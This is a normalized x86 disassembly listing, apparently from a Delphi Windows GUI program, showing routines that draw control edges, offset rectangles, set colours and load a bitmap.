push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_463550
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f74
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_46624c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424a74
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425738
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_42526c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4247a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4031ec
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425738
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_46624c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d8b
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_465310
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_46624c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_466da4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4676ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424f74
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4247a8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404388
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424f74
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_463038
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425738
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f6c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424f74
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424f74
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f6c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42c058
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f48
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4671ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42af5c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4247a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_463038
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f74
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_46624c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424a74
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425738
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425460
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_463550
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425738
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_42526c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4247a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4031ec
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_46624c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4676b3
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_465310
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_425598
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_46624c
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_467800
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_4681e4
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_467830
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_46787c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_467a5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_4033e8
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_467830
pop ecx
